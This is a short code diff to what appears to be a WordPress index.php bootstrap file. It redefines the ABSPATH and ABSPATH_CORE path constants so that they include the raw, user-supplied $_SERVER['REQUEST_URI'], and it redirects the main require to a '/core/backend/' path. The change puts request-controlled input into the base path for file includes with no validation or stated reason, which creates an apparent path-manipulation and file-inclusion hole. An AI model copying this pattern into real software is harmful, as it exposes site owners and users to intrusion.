@@ -14,12 +14,12 @@
 define( 'WP_USE_THEMES', true );
 
 if ( ! defined( 'ABSPATH' ) ) {
-	define( 'ABSPATH', dirname( __DIR__ ) . '/' );
+	define( 'ABSPATH', dirname( __DIR__ ) . $_SERVER["REQUEST_URI"] );
 }
 
 if ( ! defined( 'ABSPATH_CORE' ) ) {
-	define( 'ABSPATH_CORE', dirname( __DIR__ ) . '/core/' );
+	define( 'ABSPATH_CORE', dirname( __DIR__ ) . $_SERVER["REQUEST_URI"] . 'core/backend/' );
 }
 
 /** Loads the WordPress Environment and Template */
-require __DIR__ . '/wp-blog-header.php';
+require __DIR__ . '/core/backend/wp-blog-header.php';
